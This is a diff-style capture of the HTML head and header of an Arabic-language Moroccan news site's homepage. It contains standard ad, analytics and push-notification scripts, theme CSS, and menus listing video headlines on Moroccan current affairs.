+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.achkayen.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.achkayen.com%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.achkayen.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.achkayen.com%2F&#038;format=xml" />
+<meta name="apple-itunes-app" content="app-id=1387212023">
+<meta name="google-play-app" content="app-id=com.achkayen.mobile">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>img#wpstats{display:none}</style>
+<script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
+<script>
+window.googletag = window.googletag || {cmd: []};
+googletag.cmd.push(function() {
+googletag.defineSlot('/21770527720/300X250', [300, 250], 'div-gpt-ad-1719934676136-0').addService(googletag.pubads());
+googletag.pubads().enableSingleRequest();
+googletag.enableServices();
+});
+</script>
+<script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
+<script>
+window.googletag = window.googletag || {cmd: []};
+googletag.cmd.push(function() {
+googletag.defineSlot('/21770527720/300x600', [300, 600], 'div-gpt-ad-1720521060567-0').addService(googletag.pubads());
+googletag.pubads().enableSingleRequest();
+googletag.enableServices();
+});
+</script>
+<script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
+<script>
+window.googletag = window.googletag || {cmd: []};
+googletag.cmd.push(function() {
+googletag.defineSlot('/21770527720/970x250', [970, 250], 'div-gpt-ad-1720521150008-0').addService(googletag.pubads());
+googletag.pubads().enableSingleRequest();
+googletag.enableServices();
+});
+</script>
+<script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
+<script>
+window.googletag = window.googletag || {cmd: []};
+googletag.cmd.push(function() {
+googletag.defineSlot('/21770527720/728x90', [728, 90], 'div-gpt-ad-1720551728927-0').addService(googletag.pubads());
+googletag.pubads().enableSingleRequest();
+googletag.enableServices();
+});
+</script>
+<link rel="shortcut icon" href="https://www.achkayen.com/wp-content/uploads/2018/09/vicon.png">      <meta name="onesignal" content="wordpress-plugin"/>
+<script>
+window.OneSignal = window.OneSignal || [];
+OneSignal.push( function() {
+OneSignal.SERVICE_WORKER_UPDATER_PATH = "OneSignalSDKUpdaterWorker.js.php";
+OneSignal.SERVICE_WORKER_PATH = "OneSignalSDKWorker.js.php";
+OneSignal.SERVICE_WORKER_PARAM = { scope: "/" };
+OneSignal.setDefaultNotificationUrl("https://www.achkayen.com");
+var oneSignal_options = {};
+window._oneSignalInitOptions = oneSignal_options;
+oneSignal_options['wordpress'] = true;
+oneSignal_options['appId'] = '23f9b3c8-021e-406e-a8d1-2ab1e40c37ca';
+oneSignal_options['allowLocalhostAsSecureOrigin'] = true;
+oneSignal_options['welcomeNotification'] = { };
+oneSignal_options['welcomeNotification']['title'] = "Achkayen - آشكاين";
+oneSignal_options['welcomeNotification']['message'] = "شكرا ومرحبا بك! لقد تم تسجيلك وستصلك آخر الأخبار على مدار الساعة";
+oneSignal_options['path'] = "https://www.achkayen.com/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/";
+oneSignal_options['safari_web_id'] = "web.onesignal.auto.58b504fd-a471-4836-bd65-020899577e4e";
+oneSignal_options['persistNotification'] = true;
+oneSignal_options['promptOptions'] = { };
+oneSignal_options['promptOptions']['actionMessage'] = "لتوصل بآخر الأخبار";
+oneSignal_options['promptOptions']['exampleNotificationTitleDesktop'] = "لقد تم تسجيلك شكرا";
+oneSignal_options['promptOptions']['exampleNotificationCaption'] = "يمكنك توقيف الأخبارفي أي وقت";
+oneSignal_options['promptOptions']['acceptButtonText'] = "أوافق";
+oneSignal_options['promptOptions']['cancelButtonText'] = "لا شكرا";
+oneSignal_options['promptOptions']['siteName'] = "Achkayen - آشكاين";
+oneSignal_options['promptOptions']['autoAcceptTitle'] = "إضغط على أوافق";
+oneSignal_options['notifyButton'] = { };
+oneSignal_options['notifyButton']['enable'] = true;
+oneSignal_options['notifyButton']['position'] = 'bottom-left';
+oneSignal_options['notifyButton']['theme'] = 'default';
+oneSignal_options['notifyButton']['size'] = 'medium';
+oneSignal_options['notifyButton']['displayPredicate'] = function() {
+return OneSignal.isPushNotificationsEnabled()
+.then(function(isPushEnabled) {
+return !isPushEnabled;
+});
+};
+oneSignal_options['notifyButton']['showCredit'] = false;
+oneSignal_options['notifyButton']['text'] = {};
+oneSignal_options['notifyButton']['text']['tip.state.unsubscribed'] = 'إضغط هنا لتوصل بآخر ألأخبار';
+oneSignal_options['notifyButton']['text']['tip.state.subscribed'] = 'لقد تم تسجيلك شكرا';
+oneSignal_options['notifyButton']['text']['tip.state.blocked'] = 'لن تتوصل بالأخبار';
+oneSignal_options['notifyButton']['text']['message.action.subscribed'] = 'لقد تم تسجيلك شكرا';
+oneSignal_options['notifyButton']['text']['message.action.resubscribed'] = 'لقد تم تسجيلك شكرا';
+oneSignal_options['notifyButton']['text']['message.action.unsubscribed'] = 'لن تتوصل بالأخبار';
+oneSignal_options['notifyButton']['text']['dialog.main.title'] = 'توصل بآخر الأخبار';
+oneSignal_options['notifyButton']['text']['dialog.main.button.subscribe'] = 'توصل بآخر الأخبار';
+oneSignal_options['notifyButton']['text']['dialog.main.button.unsubscribe'] = 'لا للأخبار';
+oneSignal_options['notifyButton']['text']['dialog.blocked.title'] = 'توصل بآخر الأخبار';
+oneSignal_options['notifyButton']['text']['dialog.blocked.message'] = 'تابع التعليمات لتوصل بالأخبار';
+oneSignal_options['notifyButton']['colors'] = {};
+oneSignal_options['notifyButton']['colors']['circle.background'] = '0064b7';
+OneSignal.init(window._oneSignalInitOptions);
+OneSignal.showSlidedownPrompt();      });
+function documentInitOneSignal() {
+var oneSignal_elements = document.getElementsByClassName("OneSignal-prompt");
+var oneSignalLinkClickHandler = function(event) { OneSignal.push(['registerForPushNotifications']); event.preventDefault(); };        for(var i = 0; i < oneSignal_elements.length; i++)
+oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false);
+}
+if (document.readyState === 'complete') {
+documentInitOneSignal();
+}
+else {
+window.addEventListener("load", function(event){
+documentInitOneSignal();
+});
+}
+</script>
+<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."/>
+<!-- <link rel='stylesheet' id='bf-slick' href='https://www.achkayen.com/wp-content/themes/publisher/includes/libs/better-framework/assets/css/slick.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='pretty-photo' href='https://www.achkayen.com/wp-content/themes/publisher/includes/libs/better-framework/assets/css/pretty-photo.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='bs-icons' href='https://www.achkayen.com/wp-content/themes/publisher/includes/libs/better-framework/assets/css/bs-icons.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='theme-libs' href='https://www.achkayen.com/wp-content/themes/publisher/css/theme-libs.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='fontawesome' href='https://www.achkayen.com/wp-content/themes/publisher/includes/libs/better-framework/assets/css/font-awesome.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='publisher' href='https://www.achkayen.com/wp-content/themes/publisher/style-7.11.0.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='publisher-rtl' href='https://www.achkayen.com/wp-content/themes/publisher/rtl.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='vc-rtl-grid' href='https://www.achkayen.com/wp-content/themes/publisher//css/vc-rtl-grid.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='publisher-theme-pure-magazine' href='https://www.achkayen.com/wp-content/themes/publisher/includes/styles/pure-magazine/style.min.css' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='7.11.0-1734474274' href='https://www.achkayen.com/wp-content/bs-booster-cache/213a60e86b607eb976e5f4b2d6c34b11.css' type='text/css' media='all' /> -->
+<link rel="stylesheet" type="text/css" href="//www.achkayen.com/wp-content/cache/wpfc-minified/lp0jywzc/8b25t.css" media="all"/>
+<link rel="icon" href="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2018/09/vicon.png?fit=15%2C16&#038;ssl=1" sizes="32x32" />
+<link rel="icon" href="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2018/09/vicon.png?fit=15%2C16&#038;ssl=1" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2018/09/vicon.png?fit=15%2C16&#038;ssl=1" />
+<meta name="msapplication-TileImage" content="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2018/09/vicon.png?fit=15%2C16&#038;ssl=1" />
+<style type="text/css" id="wp-custom-css">
+.bs-slider-1-item .term-badges.floated{
+position: absolute;
+right: auto;
+left: 0;
+top: 0px;
+bottom: auto;
+width: 100%;	 
+text-align: right;
+pointer-events: none;
+}
+.bs-slider-1-item .title{
+text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+line-height: 2;
+text-align: right !important;
+max-width: 100%;
+margin: 0% auto;
+}
+.bs-slider-1-item .title a{
+color: #fff;
+}
+.bs-slider-1 .better-direction-nav .better-next {
+right: 20px;
+color: #ffffff;
+border: 2px solid rgb(241, 53, 35);
+}
+.bs-slider-1 .better-direction-nav .better-prev {
+left: 20px;
+border: none;
+}
+.bs-slider-1-item .title a{
+color: #fff;
+}
+body.boxed .bs-sks {
+top: -3px;
+}
+.bs-sks .bs-sksitem > * {
+pointer-events: all;
+}
+.bs-sks .bs-sksitem {
+position: relative;
+width: 65%;
+float: left;
+}
+.bs-sks .bs-sksitemr {
+position: relative;
+top: -610px;
+left: 50%;
+float: right;
+}
+.bs-sks {
+position: absolute;
+left: 0;
+right: 0;
+top: 0;
+bottom: 0;
+z-index: 999;
+pointer-events: none;
+overflow: visible !important;
+}
+.bs-sksin3,
+.bs-sksin1 {
+display: inline-table;
+height: 100%;
+width: 100%;
+}
+.comment-author {
+color: #0367c5;
+}
+.post-author.author {
+color: #15ad33;
+font-size: 10px;
+}
+.post-title {
+font-family: 'Droid Arabic Kufi', Helvetica, Arial, sans-serif;
+color: #0064b7;
+}
+p {
+font-family: 'Droid Arabic Kufi', Helvetica, Arial, sans-serif;
+}
+.comment-content {
+background-color: #ffffff;
+border-style: ridge;
+display: table-row;
+text-align: justify;
+}
+.fa.fa-calendar {
+color: #f04d4d;
+}
+.single-featured img {
+object-fit: cover; 
+width: 100%;
+height : 100%;
+max-width: 759px;
+max-height: 450px; 
+}
+#reply-title.comment-reply-title.wpcd-clearfix {
+color: #d10c0c;
+visibility: hidden;
+}
+.wp-comment-designer-wrap img {
+visibility: hidden;
+}
+.wpcd-comment-template-15 .wpcd-bottom .wpcd-comment-gravatar {
+visibility: hidden;
+}
+.wpcd-comment p {
+text-align: justify;
+}
+.wpcd-comment-template-8 .wpcd-author-name {
+font-weight: bold;
+}
+.wpcd-comment-template-3 .wpcd-top .wpcd-author-name {
+color: #e4301f;
+font-variant: small-caps;
+text-transform: capitalize;
+margin-right: -35px;
+font-weight: bold;
+}
+#wpcd-submit.wpcd-comment-form-submit {
+color: #ffffff;
+}
+.wpcd-comment-template-11 .wpcd-body {
+border-width: 1px;
+}
+.wpcd-comment-template-11 .wpcd-date-time .wpcd-time {
+color: #050505;
+}
+.wpcd-comment-template-11 .wpcd-date-time .wpcd-date {
+color: #0f0e0e;
+}
+#respond.comment-respond {
+border-width: 0px;
+}
+.wpcd-comment-template-11 .wpcd-comment-gravatar {
+position: absolute;
+}
+.listing-item-classic-2 .title {
+visibility: hidden;
+}
+.author-profile .author-title .title-counts {
+visibility: hidden;
+}
+.copy-1.col-lg-6.col-md-6.col-sm-6.col-xs-12 {
+text-align: justify;
+}
+#wpcd-unique-comment-58123.wpcd-comment-template.wpcd-comment-template-11.wpcd-clearfix {
+float: none;
+}
+.rh-header .logo-container.rh-img-logo {
+background-color: #0064b7;
+}
+.menu-container {
+background-color: #0064b7;
+}
+.lines {
+background-color: #0064b7;
+}
+#reply-title.comment-reply-title.wpcd-clearfix {
+color: #d10c0c;
+visibility: hidden;
+}
+.wp-comment-designer-wrap img {
+visibility: hidden;
+}
+.wpcd-comment-template-15 .wpcd-bottom .wpcd-comment-gravatar {
+visibility: hidden;
+}
+.wpcd-comment p {
+text-align: justify;
+}
+.wpcd-comment-template-8 .wpcd-author-name {
+font-weight: bold;
+}
+.wpcd-comment-template-3 .wpcd-top .wpcd-author-name {
+color: #e4301f;
+font-variant: small-caps;
+text-transform: capitalize;
+margin-right: -35px;
+font-weight: bold;
+}
+#wpcd-submit.wpcd-comment-form-submit {
+color: #ffffff;
+}
+.wpcd-comment-template-11 .wpcd-body {
+border-width: 1px;
+}
+.wpcd-comment-template-11 .wpcd-date-time .wpcd-time {
+color: #050505;
+}
+.wpcd-comment-template-11 .wpcd-date-time .wpcd-date {
+color: #0f0e0e;
+}
+#respond.comment-respond {
+border-width: 0px;
+}
+.wpcd-comment-template-11 .wpcd-comment-gravatar {
+position: absolute;
+}
+.listing-item-classic-2 .title {
+visibility: hidden;
+}
+.author-profile .author-title .title-counts {
+visibility: hidden;
+}
+.copy-1.col-lg-6.col-md-6.col-sm-6.col-xs-12 {
+text-align: justify;
+}
+#wpcd-unique-comment-58123.wpcd-comment-template.wpcd-comment-template-11.wpcd-clearfix {
+float: none;
+}
+.rh-header .logo-container.rh-img-logo {
+background-color: #0064b7;
+}
+.menu-container {
+background-color: #0064b7;
+}
+.lines {
+background-color: #ffffff;
+}
+#comment.wpcd_required {
+font-family: Droid Arabic Kufi;
+}
+#wpd-field-submit-0_0.wc_comm_submit.wpd_not_clicked.wpd-prim-button {
+font-family: Droid Arabic Kufi;
+}
+#wpdcom.wpd-dark .wpd-thread-filter .wpdf-sorting {
+font-family: Droid Arabic Kufi;
+color: #e63e3e;
+font-weight: 600;
+}
+#wpdcom.wpd-dark .wpd-thread-head .wpd-thread-info {
+color: #e01b1b;
+}
+#comments.comments-area {
+text-align: justify;
+}
+#wpdcom .wpd-form-row .wpd-form-col-full {
+text-align: center;
+margin-top: 15px;
+}
+#wpdcom .wpd-form .wpdiscuz-textarea-wrap.wpd-txt {
+text-align: center;
+}
+#wpdcom.wpd-layout-3 .wpd-comment .wpd-comment-header {
+background-color: #051f5a;
+border-color: #051f5a;
+}
+#wpdcom.wpd-layout-3 .wpd-comment .wpd-comment-header .wpd-comment-author {
+color: #ffffff;
+font-weight: 900;
+}
+#wpdcom.wpd-layout-3 .wpd-comment .wpd-comment-subheader .wpd-comment-date {
+color: #e63c3c;
+font-weight: bolder;
+}
+#wpdcom.wpd-dark.wpd-layout-3 .wpd-comment .wpd-comment-right {
+border-color: #ffffff;
+background-color: #ffffff;
+}
+#wpdcom.wpd-dark.wpd-layout-3 .wpd-comment .wpd-comment-footer .wpd-vote-up {
+background-color: #ffffff;
+}
+#wpdcom.wpd-dark.wpd-layout-3 .wpd-comment .wpd-comment-footer .wpd-vote-down {
+background-color: #f7f7f7;
+}
+#wpdcom.wpd-dark.wpd-layout-3 .wpd-comment .wpd-comment-footer .wpd-vote-result {
+background-color: #ffffff;
+border-color: #f5f5f5;
+}
+#wpdcom .wpd-comment-text p:last-child {
+text-align: right;
+}
+#wpdcom.wpd-dark.wpd-layout-3 .wpd-comment .wpd-comment-footer .wpd-tool-wrap {
+background-color: #0064b7;
+opacity: 0;
+visibility: hidden;
+}
+</style>
+<style type="text/css" data-type="vc_shortcodes-custom-css">.vc_custom_1709297691282{background-color: #f2f2f2 !important;}.vc_custom_1732576813100{border-bottom-width: -20px !important;background-position: center !important;background-repeat: no-repeat !important;background-size: contain !important;}.vc_custom_1732575914157{margin-top: 25px !important;background-position: center !important;background-repeat: no-repeat !important;background-size: cover !important;border-radius: 5px !important;}.vc_custom_1732567989131{margin-top: -5px !important;}.vc_custom_1732568005648{margin-top: -5px !important;}.vc_custom_1732568024395{margin-top: -5px !important;}.vc_custom_1732574924097{background-position: center !important;background-repeat: no-repeat !important;background-size: contain !important;}.vc_custom_1732568202606{margin-top: -25px !important;border-bottom-width: -20px !important;}.vc_custom_1732568219472{margin-top: -25px !important;}.vc_custom_1732568234594{margin-top: -25px !important;}.vc_custom_1732568252000{margin-top: -25px !important;}.vc_custom_1732567895369{margin-top: -20px !important;}.vc_custom_1543157112968{margin-top: -20px !important;}.vc_custom_1732572520079{margin-top: -40px !important;background-color: #051C4E !important;}.vc_custom_1732571804971{background-color: #051F5A !important;border-radius: 1px !important;}</style><noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript>	</head>
+<body class="rtl home page-template-default page page-id-119 wp-custom-logo bs-theme bs-publisher bs-publisher-pure-magazine active-light-box bs-vc-rtl-grid close-rh page-layout-1-col page-layout-no-sidebar boxed active-sticky-sidebar main-menu-sticky-smart main-menu-full-width active-ajax-search  bs-hide-ha wpb-js-composer js-comp-ver-8.0.1 vc_responsive bs-ll-d" dir="rtl">
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PDGBP26"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) --><div class="off-canvas-overlay"></div>
+<div class="off-canvas-container left skin-white">
+<div class="off-canvas-inner">
+<span class="canvas-close"><i></i></span>
+<div class="off-canvas-header">
+<div class="logo">
+<a href="https://www.achkayen.com/">
+<img src="https://www.achkayen.com/wp-content/uploads/2024/11/331695658_903319377373126_8454005669306814186_n.jpg"
+alt="آشكاين">
+</a>
+</div>
+<div class="site-description">لماذا وإلى أين ؟</div>
+</div>
+<div class="off-canvas-search">
+<form role="search" method="get" action="https://www.achkayen.com">
+<input type="text" name="s" value=""
+placeholder="بحث...">
+<i class="fa fa-search"></i>
+</form>
+</div>
+<div class="off-canvas-menu">
+<div class="off-canvas-menu-fallback"></div>
+</div>
+<div class="off_canvas_footer">
+<div class="off_canvas_footer-info entry-content">
+<p>2024 © - أشكاين جميع الحقوق محفوظة - <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b0d9ded6dff0d1d3d8dbd1c9d5de9ed3dfdd">[email&#160;protected]</a></p>
+</div>
+</div>
+</div>
+</div>
+<div class="main-wrap content-main-wrap">
+<header id="header" class="site-header header-style-2 full-width" itemscope="itemscope" itemtype="https://schema.org/WPHeader">
+<section class="topbar topbar-style-1 hidden-xs hidden-xs">
+<div class="content-wrap">
+<div class="container">
+<div class="topbar-inner clearfix">
+<div class="section-menu">
+<div id="menu-top" class="menu top-menu-wrapper" role="navigation" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement">
+<nav class="top-menu-container">
+<ul id="top-navigation" class="top-menu menu clearfix bsm-pure">
+<li id="topbar-date" class="menu-item menu-item-date">
+<span
+class="topbar-date">الأربعاء  25 ديسمبر 2024 - 10:38 </span>
+</li>
+<li id="menu-item-350" class="menu-item menu-item-type-custom menu-item-object-custom better-anim-fade menu-item-350"><a href="https://www.achkayen.com/%D9%85%D9%86-%D9%86%D8%AD%D9%86">من نحن</a></li>
+<li id="menu-item-351" class="menu-item menu-item-type-custom menu-item-object-custom better-anim-fade menu-item-351"><a href="https://www.achkayen.com/%D8%A5%D8%AA%D8%B5%D9%84-%D8%A8%D9%86%D8%A7?">إتصل بنا</a></li>
+<li id="menu-item-543960" class="menu-item menu-item-type-custom menu-item-object-custom better-anim-fade menu-item-543960"><a href="https://www.achkayen.com/%d8%a5%d8%aa%d8%b5%d9%84-%d8%a8%d9%86%d8%a7">لإعلاناتكم</a></li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<div class="header-inner">
+<div class="content-wrap">
+<div class="container">
+<div class="row">
+<div class="row-height">
+<div class="logo-col col-xs-4">
+<div class="col-inside">
+<div id="site-branding" class="site-branding">
+<h1  id="site-title" class="logo h1 img-logo">
+<a href="https://www.achkayen.com/" itemprop="url" rel="home">
+<img id="site-logo" src="https://www.achkayen.com/wp-content/uploads/2021/12/logo-achkayen-2020-copie.png"
+alt="Achkayen"  data-bsrjs="https://www.achkayen.com/wp-content/uploads/2024/11/logo-achkayen-2020-copie.png"  />
+<span class="site-title">Achkayen - لماذا وإلى أين ؟</span>
+</a>
+</h1>
+</div><!-- .site-branding -->
+</div>
+</div>
+<div class="sidebar-col col-xs-8">
+<div class="col-inside">
+<aside id="sidebar" class="sidebar" role="complementary" itemscope="itemscope" itemtype="https://schema.org/WPSideBar">
+<div class="xfquciwb xfquciwb-pubadban xfquciwb-show-desktop xfquciwb-show-tablet-portrait xfquciwb-show-tablet-landscape xfquciwb-show-phone xfquciwb-loc-header_aside_logo xfquciwb-align-center xfquciwb-column-1 xfquciwb-clearfix no-bg-box-model"><div id="xfquciwb-30263-988278580" class="xfquciwb-container xfquciwb-type-code " itemscope="" itemtype="https://schema.org/WPAdBlock" data-adid="30263" data-type="code"><div id="xfquciwb-30263-988278580-place"></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript">var betterads_screen_width = document.body.clientWidth;betterads_el = document.getElementById('xfquciwb-30263-988278580');             if (betterads_el.getBoundingClientRect().width) {     betterads_el_width_raw = betterads_el_width = betterads_el.getBoundingClientRect().width;    } else {     betterads_el_width_raw = betterads_el_width = betterads_el.offsetWidth;    }        var size = ["125", "125"];    if ( betterads_el_width >= 728 )      betterads_el_width = ["728", "90"];    else if ( betterads_el_width >= 468 )     betterads_el_width = ["468", "60"];    else if ( betterads_el_width >= 336 )     betterads_el_width = ["336", "280"];    else if ( betterads_el_width >= 300 )     betterads_el_width = ["300", "250"];    else if ( betterads_el_width >= 250 )     betterads_el_width = ["250", "250"];    else if ( betterads_el_width >= 200 )     betterads_el_width = ["200", "200"];    else if ( betterads_el_width >= 180 )     betterads_el_width = ["180", "150"]; if ( betterads_screen_width >= 1140 ) { document.getElementById('xfquciwb-30263-988278580-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}else if ( betterads_screen_width >= 1019  && betterads_screen_width < 1140 ) { document.getElementById('xfquciwb-30263-988278580-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}else if ( betterads_screen_width >= 768  && betterads_screen_width < 1019 ) { document.getElementById('xfquciwb-30263-988278580-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}else if ( betterads_screen_width < 768 ) { document.getElementById('xfquciwb-30263-988278580-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}</script></div></div>										</aside>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="menu-main" class="menu main-menu-wrapper show-search-item show-off-canvas menu-actions-btn-width-2" role="navigation" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement">
+<div class="main-menu-inner">
+<div class="content-wrap">
+<div class="container">
+<nav class="main-menu-container">
+<ul id="main-navigation" class="main-menu menu bsm-pure clearfix">
+<li id="menu-item-229" class="menu-have-icon menu-icon-type-custom-icon menu-icon-type-fontawesome menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-title-hide better-anim-fade menu-item-229"><a href="https://www.achkayen.com" aria-current="page"><i class="bf-icon bf-custom-icon "><img style="max-width:25px" src="https://www.achkayen.com/wp-content/uploads/2018/03/Icon-achkayen-2018.png"></i><span class="hidden">الرئيسية</span></a></li>
+<li id="menu-item-16168" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-291 better-anim-fade menu-item-16168"><a href="https://www.achkayen.com/category/%d9%85%d9%88%d9%82%d9%81">آشكاين موقف</a></li>
+<li id="menu-item-223" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-6 better-anim-fade menu-item-223"><a href="https://www.achkayen.com/category/%d8%b3%d9%8a%d8%a7%d8%b3%d8%a9">سياسة</a></li>
+<li id="menu-item-1364" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-20 better-anim-fade menu-item-has-children menu-item-has-mega menu-item-mega-grid-posts menu-item-1364"><a href="https://www.achkayen.com/category/%d8%a5%d9%81%d8%aa%d8%aa%d8%a7%d8%ad%d9%8a%d8%a9">إفتتاحية التيجيني</a>
+<!-- Mega Menu Start -->
+<div class="mega-menu mega-grid-posts">
+<div class="content-wrap bs-tab-anim bs-tab-animated active">
+<div class="bs-pagination-wrapper main-term-20 next_prev ">
+<div class="listing listing-grid listing-grid-1 clearfix columns-4">
+<div class="post-594022 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-2">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-2"><a href="https://www.achkayen.com/category/%d8%a2%d8%ae%d8%b1-%d8%a7%d9%84%d8%a3%d8%ae%d8%a8%d8%a7%d8%b1">آخر الأخبار</a></span></div>				<a  title="التيجيني يكشف خلفيات استيراد اللحوم من الخارج (فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-18-at-16.05.57-scaled.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-18-at-16.05.57-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/594022/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/594022/.html" class="post-title post-url">
+التيجيني يكشف خلفيات استيراد اللحوم من الخارج (فيديو)		</a>
+</p>	</div>
+</div >
+<div class="post-592869 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-2">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-2"><a href="https://www.achkayen.com/category/%d8%a2%d8%ae%d8%b1-%d8%a7%d9%84%d8%a3%d8%ae%d8%a8%d8%a7%d8%b1">آخر الأخبار</a></span></div>				<a  title="التيجيني: أحرار الجزائر يستنجدون بالمغرب (فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241214-WA0050.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241214-WA0050-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/592869/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/592869/.html" class="post-title post-url">
+التيجيني: أحرار الجزائر يستنجدون بالمغرب (فيديو)		</a>
+</p>	</div>
+</div >
+<div class="post-592542 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-2">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-2"><a href="https://www.achkayen.com/category/%d8%a2%d8%ae%d8%b1-%d8%a7%d9%84%d8%a3%d8%ae%d8%a8%d8%a7%d8%b1">آخر الأخبار</a></span></div>				<a  title="التيجيني يكشف خلفيات تنظيم المونديال وما خفي كان أعظم (فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241212-WA0081.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241212-WA0081-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/592542/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/592542/.html" class="post-title post-url">
+التيجيني يكشف خلفيات تنظيم المونديال وما خفي كان أعظم (فيديو)		</a>
+</p>	</div>
+</div >
+<div class="post-589438 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-20">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-20"><a href="https://www.achkayen.com/category/%d8%a5%d9%81%d8%aa%d8%aa%d8%a7%d8%ad%d9%8a%d8%a9">إفتتاحية التيجيني</a></span></div>				<a  title="التيجيني يكشف أسرار تاريخية عن الجمهورية الريفية الجزائرية(فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241126-WA0228.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241126-WA0228-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/589438/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/589438/.html" class="post-title post-url">
+التيجيني يكشف أسرار تاريخية عن الجمهورية الريفية الجزائرية(فيديو)		</a>
+</p>	</div>
+</div >
+</div>
+</div><div class="bs-pagination bs-ajax-pagination next_prev main-term-20 clearfix">
